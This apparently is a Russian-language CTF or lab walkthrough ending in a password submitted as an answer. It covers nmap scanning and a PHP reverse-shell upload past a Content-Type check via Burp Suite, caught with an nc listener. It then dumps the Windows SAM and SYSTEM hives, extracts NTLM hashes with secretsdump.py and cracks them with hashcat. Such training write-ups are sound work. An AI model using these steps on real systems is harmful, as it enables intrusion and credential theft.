1.1. sudo nmap 192.168.3.0/24 <br>
Обнаруживаем веб-сервер на 80 или 8080 порт. <br>
2.1. Скачать готовый reverse-shell для php: https://github.com/pentestmonkey/php-reverse-shell
2.2. Изменить в shell.php <br>
![img2](./img/img2.png) <br>
Вместо 127.0.0.1 – 192.168.2.2
2.3. Загрузка shell.php <br>
![img3](./img/img3.png) <br>
Но получим ошибку из неправильного допустимого контента. <rb>
2.4. Перехватываем запрос в Burp Suite и отправляем в repeater <br>
Меняем Content-type на image/jpeg . <br>
![img4](./img/img4.png) <br>
Теперь работает shell.php <br>
![img5](./img/img5.png) <br>
2.5. Включим прослушивание на 1234 порту<br
nc –lvnp 1234<br
![img6](./img/img6.png) <br>
Получим ответ и доступ к Ubuntu-машине <br>
3.1. Подключаемся по ssh по логину и паролю с помощью ssh: <br>
ssh Moscow@192.168.1.100 <br>
3.2. Дампим SAM: <br>
reg save HKLM\sam <path_to_sam_file> <br>
reg save HKLM\system <path_to_system_file> <br>

Переносим различными способами на Kali машину sam и system файлы (Ctlr+C Ctlr+C, scp 2 раза и так далее). <br>
3.3. secretsdump.py LOCAL -sam <path to sam file> -system <path to system file> <br>
Получаем NT(NTLM)-хэши, включая пользователя Polytech, запишем его в hash.txt <br> 4. Брудфорсим хэши. <br>
hashcat -m 1000 -a 0 hash.txt passwordlist.txt <br>

Полученный пароль вставляем в качестве ответа.
